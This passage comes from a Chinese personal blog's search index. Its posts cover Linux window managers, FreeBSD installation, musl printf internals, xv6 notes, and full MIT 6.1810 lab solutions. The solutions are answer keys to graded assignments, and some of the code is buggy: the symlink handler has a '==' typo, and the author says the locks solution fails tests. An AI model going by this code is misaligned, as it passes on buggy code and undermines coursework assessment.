dwm 就行，它会读取那个目录的文件参与编译。 ","date":"2023-12-01","objectID":"/posts/distrointro/:3:2","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"sway sway 是 Wayland 版本的 i3，i3 的配置文件可以直接拿来用。 开发更加保守，NVIDIA 需要附加 --unsupported-gpu 选项才能使用。 sway 依赖于 wlroots 这个 compositor，很多 Wayland 的窗口管理器都使用的这位。Hyprland 0.42 之前也是使用的它，后来自己写了一个。 sway 没有 XWayland 分数缩放的支持，sway 和 Hyprland 貌似都倾向于让 XWayland 自己实现这个功能，但是 Hyprland 提供了一个将 XWayland 的缩放设为 0，不跟配置的缩放走的选项，这样用户可以自己显示地通过设置或者命令行参数的方式单独 XWayland 的应用的缩放，sway 并没有提供这个方式。 ","date":"2023-12-01","objectID":"/posts/distrointro/:3:3","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["Linux_杂谈"],"content":"Hyparland Hyprland 是基于 Wayland 做的 WM，Hyprland 戳我的点就是官网主页列的截图。 真的好帅啊，当然 Hyparland 默认不是这样的，你需要安装其他的软件进行进一步的配置。 我尝试使用了几周，期间写的配置文件让我存放到 GitHub 仓库内了。 Hyprland 可以很好的设置环境变量，并且自带对窗口的美化。目前的最新版（0.42）移除了对 wlroots 的依赖，而是使用自己的一套。 Hyprland 比 sway 好的地方则是实现了 text-input-v1。并且支持将 XWayland 的缩放设置为 0，而不是直接按照全局的缩放比例走（我本身只有一个 electron 的应用只能跑在 XWayland 下，所以我用 flatpak 安装了它，并用 electron 命令行的方式缩放，这样还是可用的，所以 XWayland 设置为 0 缩放，我自己手动给应用缩放这个办法我还算接受） Hyprland 官方可能是用 Arch Linux 和 NixOS 的多？文档中的部分解决方案基本都是针对这两个发行版的。 ","date":"2023-12-01","objectID":"/posts/distrointro/:3:4","tags":["Linux","intro"],"title":"面向 beginner: GNU/Linux 发行版浅评与介绍","uri":"/posts/distrointro/"},{"categories":["BSD_杂谈"],"content":"在笔记本上安装FreeBSD的初步感受，因为无法日常使用，所以只是初步感受","date":"2023-10-04","objectID":"/posts/installbsd_feel/","tags":["BSD","intro"],"title":"安装FreeBSD的初步感受","uri":"/posts/installbsd_feel/"},{"categories":["BSD_杂谈"],"content":"在笔记本上安装FreeBSD的初步感受，因为无法日常使用，所以只是初步感受 安装 FreeBSD 的初步感受 virt-manager 的 UEFI 不是很能让我装上 FreeBSD，难绷。 安装 DE 的时候怎么也整不上，一旦 startx 或者启动 DM 了就卡住，后来发现应该是我 virt-manager（virt-manager 好像就是个 libvirt 的 GUI 吧）这个 QXL 的问题，但是安装了 xf86-video-qxl 也不是很好用。最后选择了 VirtualBox，按照 KDE 官网上的教程最终也是装上了 KDE Plasma 卡住的时候我还想切换到另一个 tty 结果切换不了，不过 FreeBSD 提供了 Signal User 模式，可以在真正要登陆之前先以一个高权限的身份进去，但是此时磁盘挂载是没有写权限的，需要 mount -u -o rw /重新挂一回。 shell 默认是 sh，我改成 csh，网上简单搜了一下好像没有像 bash-completion 这样的软件遂放弃补全，后来发现 starship 乱码，后来 bash 作为 VSCode-OSS 的依赖被装上了，我也就换称 bash 了（）[starship 乱码这个问题我没有在真机安装中遇到] FireFox 需要配置才能播放音频，pkg info -xD firefox 可以再次看到那些提示：打开 about:config 新建一个 media.cubeb.backend 属性填写相关的音频后端 Currently used audio backend can be inspected on about:support page. Supported backends and default probing order is as follows: pulse-rust if pulseaudio package is installed (PULSEAUDIO option) jack if jackit package is installed (JACK option) sndio if sndio package is installed (SNDIO option) alsa if alsa-lib package is installed (ALSA option) oss (always available) To force a specific backend open about:config page and create media.cubeb.backend preference. 说起 starship 乱码，konsole 上的中文也是乱码（也不能说乱码，nm 竟然是是?，对这些字符集不了解，不知道普通乱码和?的区别） 我的鼠标滚轮的往下滑还是正常的，但是上滑被识别成了返回到上一步？[这个可以通过 xmodmap 修改映射来解决，把 89 的位置设置成 0 即可，我看有人会把 7 也设置成 0] xmodmap -e \"pointer = 1 2 3 4 5 6 7 0 0 10 11 12\" 我没有太仔细了解 xmodmap 是做什么的，不能保证这个方法一定是十分适合解决这个问题的。xmodmap -pp 可以查看当前的映射。 换源是在/usr/local/etc 目录下新建了一个配置文件，用户使用 pkg 安装软件产生的文件也都在/usr/local/下了，甚至我的 home 目录也被改称了/usr/home 下。事实上，/home 指向/usr/home，它就是一个链接。 FreeBSD 有一个叫做 linuxualtor 的东西来模拟 Linux，听说好像是劫持 Linux 的 syscall 翻译成 FreeBSD 的？官方模拟的是 CentOS 7 的(linux-c7 软件包)，但也提供了别的软件用来装上 Debian/Ubuntu 之类。linux-c7 提供的 CentOS 是被修剪过的，用来安装平台上其他 linux 为前缀的软件（比如 linux-steam-utils）。 我在尝试模拟 Ubuntu 运行 linuxqq 时候遇到一个问题是窗口根本起不来。给我一种也许那里只能允许 CLI 的感觉（逃）。我曾以为也许是我虚拟机装的 FreeBSD 的原因，直到我看到了别人成功装上运行了 linuxqq。后来知道了解决方案：xhost +local:说起来，FreeBSD 对 Wayland 的支持好像还不是很行。 真机安装的时候曾有一次它甚至没有成功扫描出我的 iwlwifi，没有加载出 wlan0 无线网卡接口，我自己安装后手动设置好后不知道是不是我设置错了，反正无线网卡驱动 crash 了，不过之后我又试着装过一回倒没出现这个问题。 ","date":"2023-10-04","objectID":"/posts/installbsd_feel/:0:0","tags":["BSD","intro"],"title":"安装FreeBSD的初步感受","uri":"/posts/installbsd_feel/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第九个 lab 的 solution","date":"2023-06-22","objectID":"/posts/mit_61810_lab9/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: File system","uri":"/posts/mit_61810_lab9/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第九个 lab 的 solution File system ","date":"2023-06-22","objectID":"/posts/mit_61810_lab9/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: File system","uri":"/posts/mit_61810_lab9/"},{"categories":["刷课_Lab"],"content":"Large files (moderate) Modify bmap() so that it implements a doubly-indirect block, in addition to direct blocks and a singly-indirect block. You’ll have to have only 11 direct blocks, rather than 12, to make room for your new doubly-indirect block; you’re not allowed to change the size of an on-disk inode. The first 11 elements of ip-\u003eaddrs[] should be direct blocks; the 12th should be a singly-indirect block (just like the current one); the 13th should be your new doubly-indirect block. You are done with this exercise when bigfile writes 65803 blocks and usertests -q runs successfully: 在kernel/fs.h文件中添加以下宏定义，并修改struct dinode结构体： #define NDIRECT 11 #define INDIRECT_ONLY (BSIZE / sizeof(uint)) #define NIDIRECT_DOUBLE (BSIZE / sizeof(uint)) * (BSIZE / sizeof(uint)) #define NINDIRECT (INDIRECT_ONLY + NIDIRECT_DOUBLE) ... uint addrs[NDIRECT+2]; // Data block addresses 将kernel/file.h中的struct inode结构体保持和struct dinode同步： uint addrs[NDIRECT+2]; 接下来都是在kernel/fs.c文件中修改： 将bn \u003c NINDIRECT改成bn \u003c INDIRECT_ONLY 在这个判断下边加上： bn -= INDIRECT_ONLY; if(bn \u003c NIDIRECT_DOUBLE){ if((addr = ip-\u003eaddrs[NDIRECT+1]) == 0){ addr = balloc(ip-\u003edev); if(addr == 0) return 0; ip-\u003eaddrs[NDIRECT+1] = addr; } bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; if((addr = a[bn / INDIRECT_ONLY]) == 0){ addr = balloc(ip-\u003edev); if(addr){ a[bn / INDIRECT_ONLY] = addr; log_write(bp); } } brelse(bp); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; if((addr = a[bn % INDIRECT_ONLY]) == 0){ addr = balloc(ip-\u003edev); if(addr){ a[bn % INDIRECT_ONLY] = addr; log_write(bp); } } brelse(bp); return addr; } 将itrunc()函数修改成： void itrunc(struct inode *ip) { int i, j; struct buf *bp, *sbp; uint *a, *b; for(i = 0; i \u003c NDIRECT; i++){ if(ip-\u003eaddrs[i]){ bfree(ip-\u003edev, ip-\u003eaddrs[i]); ip-\u003eaddrs[i] = 0; } } if(ip-\u003eaddrs[NDIRECT]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c INDIRECT_ONLY; j++){ if(a[j]) bfree(ip-\u003edev, a[j]); } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); ip-\u003eaddrs[NDIRECT] = 0; } if(ip-\u003eaddrs[NDIRECT+1]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c INDIRECT_ONLY; j++){ if(a[j]){ sbp = bread(ip-\u003edev, a[j]); b = (uint*)sbp-\u003edata; for(i = 0; i \u003c INDIRECT_ONLY; i++){ if(b[i]) bfree(ip-\u003edev, b[i]); } brelse(sbp); bfree(ip-\u003edev, a[j]); } } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); ip-\u003eaddrs[NDIRECT+1] = 0; } ip-\u003esize = 0; iupdate(ip); } ","date":"2023-06-22","objectID":"/posts/mit_61810_lab9/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: File system","uri":"/posts/mit_61810_lab9/"},{"categories":["刷课_Lab"],"content":"Symbolic links (moderate) You will implement the symlink(char *target, char *path) system call, which creates a new symbolic link at path that refers to file named by target. For further information, see the man page symlink. To test, add symlinktest to the Makefile and run it. Your solution is complete when the tests produce the following output (including usertests succeeding). 在kernel/fnctl.h文件中添加： #define O_NOFOLLOW 0x800 在kernel/stat.h文件中添加： #define T_SYMLINK 4 在kernel/sysfile.c中修改sys_open()函数，在其一开始判断是否要创建文件的那个判断之后加上： if(ip-\u003etype == T_SYMLINK \u0026\u0026 !(omode \u0026 O_NOFOLLOW)){ char spath[MAXPATH]; for(int i = 0; ip-\u003etype == T_SYMLINK; i++){ if(i \u003e 9){ iunlockput(ip); end_op(); return -1; } readi(ip, 0, (uint64)spath, 0, sizeof(spath)); iunlockput(ip); ip = namei(spath); if(!ip){ end_op(); return -1; } ilock(ip); } } 并在文件后添加： uint64 sys_symlink(void) { char target[MAXPATH], path[MAXPATH]; struct inode *dip = 0; if(argstr(0, target, MAXPATH) \u003c 0) return -1; if(argstr(1, path, MAXPATH) \u003c 0) return -1; begin_op(); if((dip == namei((char *)path)) == 0){ end_op(); return -1; } dip = create(path, T_SYMLINK, 0, 0); if(writei(dip, 0, (uint64)target, 0, strlen(target)) != strlen(target)){ end_op(); return -1; } iunlockput(dip); end_op(); return 0; }","date":"2023-06-22","objectID":"/posts/mit_61810_lab9/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: File system","uri":"/posts/mit_61810_lab9/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第八个 lab 的 solution","date":"2023-05-05","objectID":"/posts/mit_61810_lab8/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Locks","uri":"/posts/mit_61810_lab8/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第八个 lab 的 solution Locks 我这个代码暂时没能通过usertests -q这个测试，在textwrite那里failed了。而且有一点很难绷，我在写Buffer cache这个lab的时候一直会panic，最后我make clean了之后重新来一次就好用了（浪费很多时间去尝试发现错误，可惜没有找到）。 ","date":"2023-05-05","objectID":"/posts/mit_61810_lab8/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Locks","uri":"/posts/mit_61810_lab8/"},{"categories":["刷课_Lab"],"content":"Memory allocator (moderate) Your job is to implement per-CPU freelists, and stealing when a CPU’s free list is empty. You must give all of your locks names that start with “kmem”. That is, you should call initlock for each of your locks, and pass a name that starts with “kmem”. Run kalloctest to see if your implementation has reduced lock contention. To check that it can still allocate all of memory, run usertests sbrkmuch. Your output will look similar to that shown below, with much-reduced contention in total on kmem locks, although the specific numbers will differ. Make sure all tests in usertests -q pass. make grade should say that the kalloctests pass. struct { struct spinlock lock; struct run *freelist; } kmemlist[NCPU]; void kinit() { for(int i = 0;i \u003c NCPU; i++) initlock(\u0026kmemlist[i].lock, \"kmem\"); freerange(end, (void*)PHYSTOP); } void kfree(void *pa) { struct run *r; push_off(); int index = cpuid(); pop_off(); if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(\u0026kmemlist[index].lock); r-\u003enext = kmemlist[index].freelist; kmemlist[index].freelist = r; release(\u0026kmemlist[index].lock); } void * kalloc(void) { struct run *r; push_off(); int index = cpuid(); pop_off(); acquire(\u0026kmemlist[index].lock); r = kmemlist[index].freelist; if(r) kmemlist[index].freelist = r-\u003enext; else{ for(int tmp = 0; tmp \u003c NCPU; tmp++){ if(tmp == index) continue; acquire(\u0026kmemlist[tmp].lock); if(kmemlist[tmp].freelist){ r = kmemlist[tmp].freelist; kmemlist[tmp].freelist = r-\u003enext; release(\u0026kmemlist[tmp].lock); break; } release(\u0026kmemlist[tmp].lock); } } release(\u0026kmemlist[index].lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } ","date":"2023-05-05","objectID":"/posts/mit_61810_lab8/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Locks","uri":"/posts/mit_61810_lab8/"},{"categories":["刷课_Lab"],"content":"Buffer cache (hard) Modify the block cache so that the number of acquire loop iterations for all locks in the bcache is close to zero when running bcachetest. Ideally the sum of the counts for all locks involved in the block cache should be zero, but it’s OK if the sum is less than 500. Modify bget and brelse so that concurrent lookups and releases for different blocks that are in the bcache are unlikely to conflict on locks (e.g., don’t all have to wait for bcache.lock). You must maintain the invariant that at most one copy of each block is cached. When you are done, your output should be similar to that shown below (though not identical). Make sure ‘usertests -q’ still passes. make grade should pass all tests when you are done. #define BNUM 13 #define HASH(x) (x % BNUM) struct { struct spinlock block_lock[BNUM]; struct buf buf[NBUF]; struct buf head[BNUM]; } bcache; void binit(void) { struct buf *b; for(int i = 0; i \u003c BNUM; i++){ initlock(\u0026bcache.block_lock[i], \"bcache\"); bcache.head[i].prev = \u0026bcache.head[i]; bcache.head[i].next = \u0026bcache.head[i]; } // Create linked list of buffers for(b = bcache.buf; b \u003c bcache.buf+NBUF; b++){ b-\u003enext = bcache.head[0].next; b-\u003eprev = \u0026bcache.head[0]; initsleeplock(\u0026b-\u003elock, \"buffer\"); bcache.head[0].next-\u003eprev = b; bcache.head[0].next = b; } } static struct buf* bget(uint dev, uint blockno) { struct buf *b; int index = HASH(blockno); acquire(\u0026bcache.block_lock[index]); // Is the block already cached? for(b = bcache.head[index].next; b != \u0026bcache.head[index]; b = b-\u003enext){ if(b-\u003edev == dev \u0026\u0026 b-\u003eblockno == blockno){ b-\u003erefcnt++; release(\u0026bcache.block_lock[index]); acquiresleep(\u0026b-\u003elock); return b; } } release(\u0026bcache.block_lock[index]); // Not cached. // Recycle the least recently used (LRU) unused buffer. for (int i = 0; i \u003c BNUM; i++) { if (i == index) continue; acquire(\u0026bcache.block_lock[i]); b = bcache.head[i].prev; for (b = bcache.head[i].prev; b != \u0026bcache.head[i]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; b-\u003eprev-\u003enext = b-\u003enext; b-\u003enext-\u003eprev = b-\u003eprev; release(\u0026bcache.block_lock[i]); acquire(\u0026bcache.block_lock[index]); b-\u003enext = bcache.head[index].next; b-\u003eprev = \u0026bcache.head[index]; bcache.head[index].next-\u003eprev = b; bcache.head[index].next = b; release(\u0026bcache.block_lock[index]); acquiresleep(\u0026b-\u003elock); return b; } } release(\u0026bcache.block_lock[i]); } panic(\"bget: no buffers\"); } void brelse(struct buf *b) { if(!holdingsleep(\u0026b-\u003elock)) panic(\"brelse\"); releasesleep(\u0026b-\u003elock); int index = HASH(b-\u003eblockno); acquire(\u0026bcache.block_lock[index]); b-\u003erefcnt--; release(\u0026bcache.block_lock[index]); } void bpin(struct buf *b) { int index = HASH(b-\u003eblockno); acquire(\u0026bcache.block_lock[index]); b-\u003erefcnt++; release(\u0026bcache.block_lock[index]); } void bunpin(struct buf *b) { int index = HASH(b-\u003eblockno); acquire(\u0026bcache.block_lock[index]); b-\u003erefcnt--; release(\u0026bcache.block_lock[index]); }","date":"2023-05-05","objectID":"/posts/mit_61810_lab8/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Locks","uri":"/posts/mit_61810_lab8/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第七个 lab 的 solution","date":"2023-04-22","objectID":"/posts/mit_61810_lab7/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Networking","uri":"/posts/mit_61810_lab7/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第七个 lab 的 solution Networking ","date":"2023-04-22","objectID":"/posts/mit_61810_lab7/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Networking","uri":"/posts/mit_61810_lab7/"},{"categories":["刷课_Lab"],"content":"Your Job (hard) Your job is to complete e1000_transmit() and e1000_recv(), both in kernel/e1000.c, so that the driver can transmit and receive packets. You are done when make grade says your solution passes all the tests. int e1000_transmit(struct mbuf *m) { uint32 index = regs[E1000_TDT]; acquire(\u0026e1000_lock); if((tx_ring[index].status \u0026 E1000_TXD_STAT_DD) != E1000_TXD_STAT_DD){ release(\u0026e1000_lock); return -1; } if(tx_mbufs[index]) mbuffree(tx_mbufs[index]); tx_ring[index].addr = (uint64)m-\u003ehead; tx_ring[index].length = m-\u003elen; tx_ring[index].cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS; tx_mbufs[index] = m; regs[E1000_TDT] = (index + 1) % TX_RING_SIZE; release(\u0026e1000_lock); return 0; } static void e1000_recv(void) { while(1){ uint32 index = (regs[E1000_RDT] + 1) % RX_RING_SIZE; if((rx_ring[index].status \u0026 E1000_RXD_STAT_DD) != E1000_RXD_STAT_DD) break; rx_mbufs[index]-\u003elen = rx_ring[index].length; net_rx(rx_mbufs[index]); rx_mbufs[index] = mbufalloc(0); rx_ring[index].addr = (uint64)rx_mbufs[index]-\u003ehead; rx_ring[index].status = 0; regs[E1000_RDT] = index; } }","date":"2023-04-22","objectID":"/posts/mit_61810_lab7/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Networking","uri":"/posts/mit_61810_lab7/"},{"categories":["源码阅读"],"content":"不自量力阅读 musl libc 的记录","date":"2023-04-22","objectID":"/posts/musl_libc_printf/","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["源码阅读"],"content":"不自量力阅读 musl libc的记录 printf ","date":"2023-04-22","objectID":"/posts/musl_libc_printf/:0:0","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["源码阅读"],"content":"printf function 函数原型 int printf(const char *restrict fmt, ...); 这里是使用了可变参数，printf()函数的大部分也是在对可变参数做处理，把处理好的结果传给另一个函数。关于处理可变参数的那些函数的作用可以在Linux manual pages中查到。 $ man 3 va_list $ man 3 stdarg The va_start() macro initializes ap for subsequent use by va_arg() and va_end(), and must be called first. 处理了可变参数后，随即就调用了vfprintf()函数，通过传参的方式把处理的结果传过去了。 ","date":"2023-04-22","objectID":"/posts/musl_libc_printf/:1:0","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["源码阅读"],"content":"vfprintf function 函数原型 int vfprintf(FILE *restrict f, const char *restrict fmt, va_list ap); 函数内部首先定义了一批局部变量，随即使用va_copy()去复制一个ap出来，随即使用printf_core()向文件描述符0写数据从而测试参数是否存在什么问题。 va_copy(ap2, ap); if (printf_core(0, fmt, \u0026ap2, nl_arg, nl_type) \u003c 0) { va_end(ap2); return -1; } 关于我说的这个第一次printf_core()函数的作用，有人发邮件问过musl libc的开发者，开发者给出的回复是： First call to printf_core() checks to see if there are any major problems with the format string. 当说到第二次的调用也可以做到check的效果时，开发者回复： POSIX says that to the extent possible, all functions are supposed to either fail with no side effects or succeed with side effects. There are some functions that can fail with side effects, but we make some effort to minimize that. By testing the format string first, if it is broken, we can fail without side effects. If only the second call tested that, you would get a partial output before failure. 至于为什么要使用va_copy()再整个va_list出来，我认为大抵是为了保证函数内部的封闭性，我这里说的封闭性就是尽量不使用外部的变量，va_list传进来貌似是指针形式传递进来的，为了不影响到外部的变量，故而复制一份出来。 之后便是给f上个锁，再保存一下之前的错误位，然后把错误位设置为0 FLOCK(f); olderr = f-\u003eflags \u0026 F_ERR; f-\u003eflags \u0026= ~F_ERR; 而后看f的buf size是否为0，为0的话就临时把之前定义好的intelnal_buf作为f的buf使用。 if (!f-\u003ebuf_size) { saved_buf = f-\u003ebuf; f-\u003ebuf = internal_buf; f-\u003ebuf_size = sizeof internal_buf; f-\u003ewpos = f-\u003ewbase = f-\u003ewend = 0; } 之后再做一个判断，就要开始真正往stdout写数据了 if (!f-\u003ewend \u0026\u0026 __towrite(f)) ret = -1; else ret = printf_core(f, fmt, \u0026ap2, nl_arg, nl_type); 之后就是对f原本buf的恢复 if (saved_buf) { f-\u003ewrite(f, 0, 0); if (!f-\u003ewpos) ret = -1; f-\u003ebuf = saved_buf; f-\u003ebuf_size = 0; f-\u003ewpos = f-\u003ewbase = f-\u003ewend = 0; } 然后再判一遍f的error，并恢复错误位 if (ferror(f)) ret = -1; f-\u003eflags |= olderr; 最后解开f的锁，结束掉ap2，然后return。 ","date":"2023-04-22","objectID":"/posts/musl_libc_printf/:2:0","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["源码阅读"],"content":"printf_core function 函数原型 static int printf_core(FILE *f, const char *fmt, va_list *ap, union arg *nl_arg, int *nl_type); 首先依旧是定义了一批局部变量，然后开始循环处理参数 首先判断l和cnt时候会造成整数溢出 if (l \u003e INT_MAX - cnt) goto overflow; 然后更新cnt，并且判断s是否为0 cnt += l; if (!*s) break; 之后是处理**%%**这样的情况 for (a=s; *s \u0026\u0026 *s!='%'; s++); for (z=s; s[0]=='%' \u0026\u0026 s[1]=='%'; z++, s+=2); if (z-a \u003e INT_MAX-cnt) goto overflow; l = z-a; if (f) out(f, a, l); if (l) continue; 随后是对参数位置的处理 对此，Linux manual pages上是这么写的： By default, the arguments are used in the order given, where each ‘*’ (see Field width and Precision below) and each conversion specifier asks for the next argument (and it is an error if insufficiently many arguments are given). One can also specify explicitly which argument is taken, at each place where an argument is required, by writing “%m$” instead of ‘%’ and “*m$” instead of ‘*’, where the decimal integer m denotes the position in the argument list of the desired argument, indexed starting from 1. if (isdigit(s[1]) \u0026\u0026 s[2]=='$') { l10n=1; argpos = s[1]-'0'; s+=3; } else { argpos = -1; s++; } 这里的l10n变量是表示是否启用本地化 之后是对flags的读取 for (fl=0; (unsigned)*s-' '\u003c32 \u0026\u0026 (FLAGMASK\u0026(1U\u003c\u003c*s-' ')); s++) fl |= 1U\u003c\u003c*s-' '; 这里的FLAGMASK是define的宏： #define FLAGMASK (ALT_FORM | ZERO_PAD | LEFT_ADJ | PAD_POS | MARK_POS | GROUPED) 其中像ALT_FORM这样的也都是define的宏，整个展开就是： #define FLAGMASK ((1U \u003c\u003c '#' - ' ') | (1U \u003c\u003c '0' - ' ') | (1U \u003c\u003c '-' - ' ') | (1U \u003c\u003c ' ' - ' ') | (1U \u003c\u003c '+' - ' ') | (1U \u003c\u003c '\\'' - ' ')) 然后读取field width An optional decimal digit string (with nonzero first digit) specifying a minimum field width. If the converted value has fewer characters than the field width, it will be padded with spaces on the left (or right, if the left-adjustment flag has been given). Instead of a decimal digit string one may write “*” or “*m$” (for some decimal integer m) to specify that the field width is given in the next argument, or in the m-th argument, respectively, which must be of type int. if (*s=='*') { if (isdigit(s[1]) \u0026\u0026 s[2]=='$') { l10n=1; if (!f) nl_type[s[1]-'0'] = INT, w = 0; else w = nl_arg[s[1]-'0'].i; s+=3; } else if (!l10n) { w = f ? va_arg(*ap, int) : 0; s++; } else goto inval; if (w\u003c0) fl|=LEFT_ADJ, w=-w; } else if ((w=getint(\u0026s))\u003c0) goto overflow; 可以看到，除了精度，它还处理了改变参数顺序的一种方法，并通过三目运算符判断f时候为0来决定是做测试还是正常work，这样的处理在后面也有用到。 之后是处理精度 An optional precision, in the form of a period (’.’) followed by an optional decimal digit string. Instead of a decimal digit string one may write “*” or “*m$” (for some decimal integer m) to specify that the precision is given in the next argument, or in the m-th argument, respectively, which must be of type int. If the precision is given as just ‘.’, the precision is taken to be zero. if (*s=='.' \u0026\u0026 s[1]=='*') { if (isdigit(s[2]) \u0026\u0026 s[3]=='$') { if (!f) nl_type[s[2]-'0'] = INT, p = 0; else p = nl_arg[s[2]-'0'].i; s+=4; } else if (!l10n) { p = f ? va_arg(*ap, int) : 0; s+=2; } else goto inval; xp = (p\u003e=0); } else if (*s=='.') { s++; p = getint(\u0026s); xp = 1; } else { p = -1; xp = 0; } 之后对处理format st=0; do { if (OOB(*s)) goto inval; ps=st; st=states[st]S(*s++); } while (st-1\u003cSTOP); if (!st) goto inval; states是一个二维数组，如果format没有经过修饰（只是d, f这样的）就不会有第二次循环，修饰了就会再次进入循环。 之后检查参数类型是否有效，并保存参数的值 if (st==NOARG) { if (argpos\u003e=0) goto inval; } else { if (argpos\u003e=0) { if (!f) nl_type[argpos]=st; else arg=nl_arg[argpos]; } else if (f) pop_arg(\u0026arg, st, ap); else return 0; } 可以这里先判了一手，如果参数类型没啥问题再判断参数位置是否被设定过。 这里的pop_arg()函数就是读取参数到arg里。 之后判断这次调用只是做测试还是真的要打印，并且判一回f是否有问题 if (!f) continue; if (ferror(f)) return -1; 再做一些处理，再此之前先定义一波变量 z = buf + sizeof(buf); prefix = \"-+ 0X0x\"; pl = 0; t = s[-1]; 处理的是将ls, lc干成S, C 因为’-‘和'0’是互斥的，所以也要处理一下。 if (ps \u0026\u0026 (t\u002615)==3) t\u0026=~32; if (fl \u0026 LEFT_ADJ) fl \u0026= ~ZERO_PAD; 之后就是针对不同类型的处理了，由于类型太多，源码就不贴过来了，我也不准备都看一遍类型都是怎么处理的。 比如这里关于整数的处理 case 'd': case 'i': pl=1; if (arg.i\u003eINTMAX_MAX) { arg.i=-arg.i; } else if (fl \u0026 MARK_POS) { prefix++; } else if (fl \u0026 PAD_POS) { prefix+=2; } else pl=0; case 'u': a = fmt_u(arg.i, z); } if (xp \u0026\u0026 p\u003c0) goto overflow; if (x","date":"2023-04-22","objectID":"/posts/musl_libc_printf/:2:1","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["源码阅读"],"content":"out function out()就一行代码 if (!ferror(f)) __fwritex((void *)s, l, f); 可以看到这里调用了__fwritex()函数，这是一个hidden的函数，实现在fwrite.c中。 ","date":"2023-04-22","objectID":"/posts/musl_libc_printf/:2:2","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["源码阅读"],"content":"__fwritex function 首先再次做了一波判断 if (!f-\u003ewend \u0026\u0026 __towrite(f)) return 0; 其次先判断f是否有足够的空间容纳要写的数据，如果没有调用write syscall if (l \u003e f-\u003ewend - f-\u003ewpos) return f-\u003ewrite(f, s, l); 如果有足够的空间，就先判断一手f的行缓冲模式(line buf flag)是否设置，如果是行缓冲模式，会先把数据写到buf里，如果遇到了\\n就写到f里，换行符后面的部分会通过调用memcpy写入buf里。如果不是行缓冲，就先把数据都写入buf里。 关于刚刚说的这个，可以在iSO C标准中找到，下面这个摘抄自我找的C17标准文档： When a stream is line buffered, characters are intended to be transmitted to or from the host environment as a block when a new-line character is encountered. 行缓冲里有个关于n和i的判断，这里为什么有小于关系，下面是Linux manual pages $ man 2 write Note that a successful write() may transfer fewer than count bytes. Such partial writes can occur for various reasons; for example, because there was insufficient space on the disk device to write all of the requested bytes, or because a blocked write() to a socket, pipe, or similar was interrupted by a signal handler after it had transferred some, but before it had transferred all of the requested bytes. 如果数据被写入了buf里面，就只能等到f被关闭的时候（如果源码中没有指定大抵就是程序退出的时候）就会把buf里的数据写出去 A file may be disassociated from a controlling stream by closing the file. Output streams are flushed (any unwritten buffer contents are transmitted to the host environment) before the stream is disassociated from the file. If the main function returns to its original caller, or if the exit function is called, all open files are closed (hence all output streams are flushed) before program termination. 上面这段同样摘抄自我找的C17标准文档 ","date":"2023-04-22","objectID":"/posts/musl_libc_printf/:2:3","tags":["musl libc"],"title":"musl libc 阅读记录: printf","uri":"/posts/musl_libc_printf/"},{"categories":["刷课笔记"],"content":"Xv6 book的第八章节","date":"2023-04-22","objectID":"/posts/xv6_book_chapter_8/","tags":["Xv6_RISC-V"],"title":"Xv6 book: File system","uri":"/posts/xv6_book_chapter_8/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第八章节 File system 文件系统的目的是组织和存储数据。文件系统通常支持在用户和应用程序之间共享数据，以及持久性，以便在重新启动后数据仍然可用。 Xv6文件系统提供类似于Unix的文件、目录和路径名（参见第1章），并将其数据存储在virtio磁盘上以实现持久性。文件系统解决了以下几个问题： 文件系统需要在磁盘上使用数据结构来表示命名目录和文件的树形结构，记录每个文件内容所在块的标识，并记录磁盘上哪些区域是空闲的。 文件系统必须支持崩溃恢复。也就是说，如果发生崩溃（例如断电），文件系统在重新启动后必须仍然正确工作。风险在于崩溃可能会中断一系列更新，导致不一致的磁盘上数据结构（例如，一个既在文件中使用又被标记为空闲的block）。 不同的进程可能同时操作文件系统，因此文件系统代码必须协调以维护不变性。 